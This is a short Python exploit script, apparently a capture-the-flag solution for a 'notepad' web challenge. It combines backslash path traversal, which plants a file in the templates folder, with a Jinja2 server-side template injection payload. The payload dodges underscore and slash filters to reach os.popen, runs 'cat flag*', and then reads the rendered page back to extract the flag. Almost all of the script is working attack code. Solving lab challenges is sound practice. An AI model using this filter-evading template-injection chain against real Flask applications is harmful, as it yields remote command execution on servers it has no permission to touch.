import sys, requests, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
requests.packages.urllib3.disable_warnings()
BASE = "https://notepad.mars.cylabacademy.net"
S = requests.Session()
S.headers.update({"User-Agent": "Mozilla/5.0"})

tpl = ("{%set u=(config|string)[73]%}"
       "{%print(config|attr(u*2+'class'+u*2)|attr(u*2+'init'+u*2)|attr(u*2+'globals'+u*2)"
       "|attr('get')('os')|attr('popen')('cat flag*')|attr('read')())%}")
content = "\\..\\templates\\errors\\pwn" + tpl
assert "_" not in content, "underscore present!"
assert "/" not in content, "slash present!"
print("payload len:", len(content))
r = S.post(BASE + "/new", data={"content": content}, timeout=25, verify=False, allow_redirects=False)
loc = r.headers.get("Location", "")
print("status:", r.status_code)
m = re.search(r"/static/(.+)\.html$", loc)
if not m:
    print("loc:", loc[:200])
    sys.exit(1)
name = m.group(1).split("/")[-1]
print("fichier:", name)
r2 = S.get(BASE + "/", params={"error": name[: -len(".html")]}, timeout=25, verify=False)
print("=== REPONSE ===")
print(r2.text[:2000])
f = re.search(r"(?:academy|picoCTF)\{[^}]*\}", r2.text)
print("\nFLAG:", f.group(0) if f else "non trouve")
